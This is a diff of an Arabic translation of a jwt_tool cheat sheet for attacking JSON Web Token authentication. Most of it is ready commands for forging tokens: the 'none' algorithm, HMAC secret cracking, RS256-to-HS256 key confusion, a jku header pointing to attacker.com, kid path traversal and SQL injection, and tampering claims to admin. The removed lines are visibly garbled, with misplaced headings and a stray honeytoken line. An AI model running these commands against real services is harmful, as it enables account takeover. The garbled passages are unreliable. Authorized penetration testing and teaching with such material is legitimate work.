@@ -1,12 +1,16 @@
-# 🪙 jwt_tool — ورقة مرجعية شاملة
-
 <!-- language-home-navigation -->
 [🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🪙 jwt_tool - ورقة الغش الكاملة
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
        ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
        ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
@@ -16,54 +20,52 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
         All-in-One JSON Web Token Manipulation & Exploitation Suite
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
   <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
-  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
+  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="أمان الويب">
   <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
-</p>
+</ص>
 
 <p align="center">
-  <b>🪙 Powerful Python CLI toolkit for analyzing, tampering, forging, scanning, and cracking JSON Web Tokens (JWT)</b>
-</p>
+  <b>🪙 مجموعة أدوات Python CLI القوية لتحليل رموز JSON Web Tokens (JWT) والتلاعب بها وتزويرها ومسحها ضوئيًا وتكسيرها</b>
+</ص>
 
 ---
 
 ## 📋 جدول المحتويات
 
-- [مقدمة](#-overview--jwt-anatomy)
-- [التثبيت](#-installation)
-- [Token Parsing & Inspection](#-token-parsing--inspection)
-- [Automated Vulnerability Scanning (`-M at`)](#-automated-vulnerability-scanning--m-at)
-- [Common Exploitation Scenarios](#-common-exploitation-scenarios)
-  - [Empty signature handling](#algorithm-confusion--none-attack-none)
-  - [HMAC Secret Key Cracking](#hmac-secret-key-cracking)
-  - [Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.](#key-confusion-rs256-to-hs256-with-public-key)
-  - [Header Injection: JKU, X5U & JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
-  - [KID Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
-- [Payload Tampering & Forging Claims](#-payload-tampering--forging-claims)
-- [مرجع سريع](#-quick-reference-table)
-- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [نظرة عامة وتشريح JWT](#-نظرة عامة--JWT-تشريح)
+- [التثبيت](#-التثبيت)
+- [تحليل الرمز المميز وفحصه](#-تحليل الرمز المميز--الفحص)
+- [الفحص الآلي للثغرات الأمنية (`-M at`)](#-الفحص الآلي للثغرات الأمنية--m-at)
+- [سيناريوهات الاستغلال الشائعة](#-سيناريوهات الاستغلال الشائعة)
+  - [ارتباك الخوارزمية / لا يوجد هجوم (`none`)](#ارتباك الخوارزمية--لا شيء-هجوم-لا شيء)
+  - [اختراق مفتاح HMAC السري](#hmac-secret-key-cracking)
+  - [ارتباك المفاتيح: RS256 إلى HS256 مع المفتاح العام](#key-confusion-rs256-to-hs256-with-public-key)
+  - [حقن الرأس: انتحال JKU وX5U وJWK](#header-injection-jku-x5u--jwk-spoofing)
+  - [حقن KID (SQLi واجتياز المسار)](#kid-injection-sqli--path-traversal)
+- [مطالبات التلاعب بالحمولة والتزوير](#-التلاعب بالحمولة--مطالبات التزوير)
+- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
+- [الاعتبارات الدفاعية والتصلب](#-الاعتبارات الدفاعية--التصلب)
+- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
 
 ---
 
-## 🎯 مقدمة
+## 🎯 نظرة عامة وتشريح JWT
 
-[Legal Disclaimer](#-legal-disclaimer)
+يتكون رمز ويب JSON (RFC 7519) من ثلاثة أجزاء مشفرة بـ Base64URL مفصولة بنقاط (`.`):
 `header.payload.signature`
 
-1. **Header:** Identifies token type (`typ`) and signing algorithm (`alg`, e.g., `HS256`, `RS256`, `none`).
-🎯 مقدمة
-3. **Signature:** Cryptographic verification hash preventing client-side tampering.
+1. **الرأس:** يحدد نوع الرمز المميز (`typ`) وخوارزمية التوقيع (`alg`، على سبيل المثال، `HS256`، `RS256`، `none`).
+2. **الحمولة:** تحتوي على مطالبات المستخدم (`sub`، `role`، `admin`، `exp`).
+3. **التوقيع:** تجزئة التحقق التشفيري تمنع التلاعب من جانب العميل.
 
-Created by **ticarpi**, **jwt_tool** automates testing for architectural and implementation flaws in JWT authentication workflows across APIs and modern web applications.
+تم إنشاء **jwt_tool** بواسطة **ticarpi**، ويقوم بأتمتة اختبار العيوب المعمارية والتنفيذية في سير عمل مصادقة JWT عبر واجهات برمجة التطبيقات وتطبيقات الويب الحديثة.
 
 ---
 
 ## 📥 التثبيت
-
 ```bash
 # Clone the repository
 git clone https://github.com/ticarpi/jwt_tool.git
@@ -75,22 +77,19 @@ pip install -r requirements.txt
 # Run jwt_tool
 python3 jwt_tool.py --help
 ```
-
 ---
 
-## 🔍 Token Parsing & Inspection
+## 🔍 تحليل وفحص الرمز المميز
 
-Decode and inspect header parameters and payload claims:
+فك تشفير وفحص معلمات الرأس ومطالبات الحمولة:
 ```bash
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
 ```
-
 ---
 
-## ⚡ Automated Vulnerability Scanning (`-M at`)
+## ⚡ المسح الآلي للثغرات الأمنية (`-M at`)
 
-Launch automated playbook scans testing known vulnerabilities against a target web service:
-
+قم بتشغيل عمليات فحص قواعد اللعبة الآلية لاختبار نقاط الضعف المعروفة ضد خدمة الويب المستهدفة:
 ```bash
 # Run All Tests (-M at) sending requests to web endpoint
 python3 jwt_tool.py <JWT_TOKEN> \
@@ -98,48 +97,45 @@ python3 jwt_tool.py <JWT_TOKEN> \
   -u "https://api.target.com/user/profile" \
   -rh "Authorization: Bearer <JWT_TOKEN>"
 ```
-*Tests executed:*
-- ⚡ Automated Vulnerability Scanning (`-M at`)
-- RSA to HMAC key confusion
-- Launch automated playbook scans testing known vulnerabilities against a target web service:
-- Injection into `kid`, `jku`, `x5u` headers
-- Empty signature handling
+*الاختبارات المنفذة:*
+- تجريد التوقيع (لا توجد متغيرات خوارزمية)
+- RSA إلى الارتباك مفتاح HMAC
+- التلاعب بالمطالبة (`admin=true`، تصعيد الامتيازات)
+- الحقن في رؤوس `kid`، `jku`، `x5u`
+- التعامل مع التوقيع الفارغ
 
 ---
 
-## 💥 أمثلة عملية
+## 💥سيناريوهات الاستغلال الشائعة
 
-### Empty signature handling
-When backend implementations accept unsigned tokens:
+### ارتباك الخوارزمية / لا يوجد هجوم (`none`)
+عندما تقبل تطبيقات الواجهة الخلفية الرموز المميزة غير الموقعة:
 ```bash
 # Forge token with 'none' algorithm and stripped signature
 python3 jwt_tool.py <JWT_TOKEN> -X a
 ```
-*Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.
+*تم اختبار المتغيرات تلقائيًا:* `none`، `None`، `NONE`، `nOnE`.
 
-### HMAC Secret Key Cracking
-Algorithm Confusion / None Attack (`none`)
+### تكسير المفتاح السري لـ HMAC
+عندما يستخدم HS256/HS384/HS512 عبارة مرور ضعيفة:
 ```bash
 # Dictionary attack using rockyou.txt
 python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
 ```
-
-### Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.
-If the server signs with RSA (RS256) but accepts HMAC (HS256) using its public certificate as the shared HMAC key:
+### الارتباك الرئيسي: RS256 إلى HS256 مع المفتاح العام
+إذا قام الخادم بالتوقيع باستخدام RSA (RS256) ولكنه يقبل HMAC (HS256) باستخدام شهادته العامة كمفتاح HMAC مشترك:
 ```bash
 # Forge token using server public key file
 python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
 ```
-
-### Header Injection: JKU, X5U & JWK Spoofing
-Injecting attacker-controlled keys or URLs:
+### حقن الرأس: خداع JKU وX5U وJWK
+إدخال مفاتيح أو عناوين URL يتحكم فيها المهاجم:
 ```bash
 # Inject attacker-controlled JWKS URL in jku header
 python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
 ```
-
-### KID Injection (SQLi & Path Traversal)
-If the backend uses the `kid` (Key ID) header parameter directly in database queries or file paths:
+### حقن KID (SQLi واجتياز المسار)
+إذا كانت الواجهة الخلفية تستخدم معلمة رأس `kid` (معرف المفتاح) مباشرة في استعلامات قاعدة البيانات أو مسارات الملفات:
 ```bash
 # Path traversal pointing to /dev/null (empty secret)
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
@@ -147,13 +143,11 @@ python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
 # SQL Injection in kid header to bypass signature verification
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
 ```
-
 ---
 
-## ✍️ Payload Tampering & Forging Claims
+## ✍️ التلاعب بالحمولة وتزوير المطالبات
 
-Modify specific claim values and resign the token:
-
+تعديل قيم مطالبة محددة واستقالة الرمز المميز:
 ```bash
 # Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
 python3 jwt_tool.py <JWT_TOKEN> \
@@ -162,32 +156,31 @@ python3 jwt_tool.py <JWT_TOKEN> \
   -pc "role" -pv "SuperAdmin" \
   -k "secret_key"
 ```
+---
+
+## ⚡ جدول مرجعي سريع
+
+| الهدف | الأمر |
+|-----------|--------|
+| **فك التشفير والتحليل المميز** | `python3 jwt_tool.py <JWT>` |
+| ** مسح قواعد اللعبة الكل في واحد ** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
+| **الكراك سر HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
+| ** تجاوز بدون خوارزمية ** | `python3 jwt_tool.py <JWT> -X a` |
+| **RS256 -> ارتباك HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
+| ** حمولة العبث والتوقيع ** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
+| ** اجتياز مسار الطفل ** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |
 
 ---
 
-## ⚡ مرجع سريع
+## 🛡️ الاعتبارات الدفاعية والتصلب
 
-|Objective|الأمر|
-|-----------|---------|
-|**Decode & Parse Token**|`python3 jwt_tool.py <JWT>`|
-|**All-in-One Playbook Scan**|`python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"`|
-|**Crack HMAC Secret**|`python3 jwt_tool.py <JWT> -C -d rockyou.txt`|
-|**Bypass with None Algorithm**|`python3 jwt_tool.py <JWT> -X a`|
-|**RS256 -> HS256 Confusion**|`python3 jwt_tool.py <JWT> -X k -pk public.pem`|
-|**Tamper Payload & Sign**|`python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>`|
-|**KID Path Traversal**|`python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""`|
+1. **القائمة البيضاء الصارمة للخوارزميات:** لا تقبل مطلقًا `none` أو تبديل الخوارزمية. التحقق بشكل صريح من الخوارزميات المتوقعة (`RS256` فقط).
+2. **رفض المفاتيح التي يتحكم فيها العميل:** لا تثق بشكل أعمى في رؤوس `jku`، أو `jwk`، أو `x5u` من المدخلات غير الموثوق بها دون قوائم السماح الصارمة للنطاق.
+3. **استخدم الأسرار القوية:** تأكد من أن مفاتيح HMAC تحتوي على 256 بت على الأقل من البايتات العشوائية المشفرة ذات الإنتروبيا العالية.
 
 ---
 
-## 🛡️ Defensive Considerations & Hardening
+## ⚠️إخلاء المسؤولية القانونية
 
-|**KID Path Traversal**|`python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""`|
-2. **Reject Client-Controlled Keys:** Do not blindly trust `jku`, `jwk`, or `x5u` headers from untrusted input without strict domain allowlists.
-3. **Use Strong Secrets:** Ensure HMAC keys are at least 256 bits of high-entropy cryptographic random bytes.
-
----
-
-## ⚠️ Legal Disclaimer
-
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> jwt_tool is designed strictly for authorized penetration testing, API vulnerability assessments, and educational research. Forging tokens to access unauthorized systems without written permission is strictly illegal.
+> [!تنبيه]
+> تم تصميم jwt_tool بشكل صارم لاختبارات الاختراق المعتمدة، وتقييمات نقاط ضعف واجهة برمجة التطبيقات (API)، والأبحاث التعليمية. يعد تزوير الرموز المميزة للوصول إلى أنظمة غير مصرح بها دون إذن كتابي أمرًا غير قانوني تمامًا.
